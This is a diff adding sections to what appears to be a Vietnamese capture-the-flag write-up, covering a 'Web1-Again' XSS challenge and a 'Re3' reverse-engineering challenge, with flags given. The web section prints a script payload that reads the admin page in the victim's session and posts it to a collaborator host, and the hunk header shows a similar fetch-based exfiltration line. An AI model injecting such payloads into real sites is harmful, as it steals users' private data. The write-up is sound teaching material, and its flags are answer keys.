@@ -217,3 +217,122 @@ onerror+="fetch('http://zhkkvmum0fax47nsznozle8vsmyfm4.burpcollaborator.net/',+{
   ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic7.jpg?raw=true)
   
 **Flag**: `ATTT{4_51mpl3_r3v_5ql}`
+
+# Web: Web1-Again
+
+#### Challenge
+
+[Link challenge](http://167.172.80.186:9999/) - [Link bot](http://167.172.80.186:8888/)
+
+#### Solution
+
+* Đối với challenge này cũng tương tự challenges web-1 nhưng điều khác biệt ở đây cookie đã được set flag httponly như vậy ta không thể lấy được cookie người dùng. Từ đó, tôi đã nghĩ ra cách làm thế nào mình có thể đọc được trang web admin bằng html. Và tôi thực hiện tương tự điều trên với payload như sau:
+``` 
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = handleResponse;
+   req.open('get','http://167.172.80.186:9999/admin.php',true);
+   req.send();
+   function handleResponse() {
+    var token = this.responseText;
+   var changeReq = new XMLHttpRequest();
+   changeReq.open('post', 'http://burp.collaborator.client', true);
+   changeReq.send('data='+token);
+};
+</script>
+```
+
+* Và tôi đã nhận được flag/
+
+**Flag**: `ATTT{4c3076335f56407476303639}`
+
+
+# RE: Re3
+
+#### Challenge
+
+[Complimentary.exe](https://github.com/vinhxinh/SVATTT_PTIT_2023/raw/main/Re3/ComplimentaryChallenge.exe)
+
+#### Solution
+
+* Đối với bài này khi đưa vào ida32bit ta sẽ đọc được source code như sau:
+
+``` 
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  FILE *v3; // eax
+  FILE *v5; // eax
+  FILE *v6; // eax
+  DWORD Mode; // [esp+18h] [ebp-20h] BYREF
+  char Str[4]; // [esp+1Ch] [ebp-1Ch] BYREF
+  int v9; // [esp+20h] [ebp-18h]
+  int v10; // [esp+24h] [ebp-14h]
+  int v11; // [esp+28h] [ebp-10h]
+  HANDLE hConsoleHandle; // [esp+2Ch] [ebp-Ch]
+
+  __main();
+  *(_DWORD *)Str = 523448849;
+  v9 = 406598155;
+  v10 = 557725189;
+  v11 = 3741480;
+  xor_strings(Str, "ISPw");
+  hConsoleHandle = GetStdHandle(0xFFFFFFF5);
+  if ( hConsoleHandle == (HANDLE)-1 )
+  {
+    v3 = ___acrt_iob_func(2u);
+    fwrite("Failed to get console handle\n", 1u, 0x1Du, v3);
+    return 1;
+  }
+  else if ( GetConsoleMode(hConsoleHandle, &Mode) )
+  {
+    Mode |= 4u;
+    if ( SetConsoleMode(hConsoleHandle, Mode) )
+    {
+      printf("Flag: ATTT{%s}\x1B[2K\x1B[1GWhat are you waiting for?", Str);
+      return 0;
+    }
+    else
+    {
+      v6 = ___acrt_iob_func(2u);
+      fwrite("Failed to set console mode\n", 1u, 0x1Bu, v6);
+      return 1;
+    }
+  }
+  else
+  {
+    v5 = ___acrt_iob_func(2u);
+    fwrite("Failed to get console mode\n", 1u, 0x1Bu, v5);
+    return 1;
+  }
+}
+
+```
+
+* Ở đây ta thấy rằng flag chính là Str và chúng ta sẽ quan tâm đến Str tạo ra như thế nào.
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re3/pic1.png?raw=true)
+  
+* Như ta đã thấy các giá trị trong Str cũng là các giá trị dạng hex của Str, v9, v10, v11 vì Str được khai báo 4 Byte và v9, v10, v11 là 4 byte và địa chỉ sẽ tiếp tục được nối và gán với nhau như trên.
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re3/pic2.jpg?raw=true)
+
+* Ở đây ta thấy được Str được xor với "ISPw" theo một cách lần lượt đó cũng chính là `xor edx ecx` và gán lại `dl cho địa chỉ hiện tại eax đó là Str[i]`. Từ đó, chúng ta có thể tiếp tục debug tìm ra chuỗi `Str` như sau:
+
+```
+Stack[00003D94]:0061FEAC db  58h ; X
+Stack[00003D94]:0061FEAD db  61h ; a
+Stack[00003D94]:0061FEAE db  63h ; c
+Stack[00003D94]:0061FEAF db  68h ; h
+Stack[00003D94]:0061FEB0 db  42h ; B
+Stack[00003D94]:0061FEB1 db  61h ; a
+Stack[00003D94]:0061FEB2 db  6Ch ; l
+Stack[00003D94]:0061FEB3 db  6Fh ; o
+Stack[00003D94]:0061FEB4 db  4Ch ; L
+Stack[00003D94]:0061FEB5 db  65h ; e
+Stack[00003D94]:0061FEB6 db  6Eh ; n
+Stack[00003D94]:0061FEB7 db  56h ; V
+Stack[00003D94]:0061FEB8 db  61h ; a
+Stack[00003D94]:0061FEB9 db  44h ; D
+Stack[00003D94]:0061FEBA db  69h ; i
+```
+
+**Flag**: `ATTT{XachBaloLenVaDi}`
